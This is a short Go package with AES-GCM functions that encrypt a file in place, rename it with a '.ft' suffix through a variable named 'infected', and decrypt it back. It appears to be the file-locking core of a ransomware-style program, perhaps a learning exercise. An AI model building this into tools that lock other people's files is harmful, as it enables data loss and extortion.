package crypt 

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"strings"
	"io"
	"os"
)

// Generates AES in GCM mode + random nonce then renames the file and overwrites it with the encrypted data
func EncryptFile(key []byte, filePath string) error {
	plaintext, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

	infected := filePath + ".ft"
	os.Rename(filePath, infected )

	return os.WriteFile(infected , ciphertext, 0644)
}

func DecryptFile(key []byte, filePath string) error {
	ciphertext, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return fmt.Errorf("ciphertext too short")
	}

	nonce := ciphertext[:nonceSize]
	data := ciphertext[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, data, nil)
	if err != nil {
		return err
	}
	cleaned := strings.TrimSuffix(filePath, ".ft")
	os.Rename(filePath, cleaned)

	return os.WriteFile(cleaned, plaintext, 0644)
}
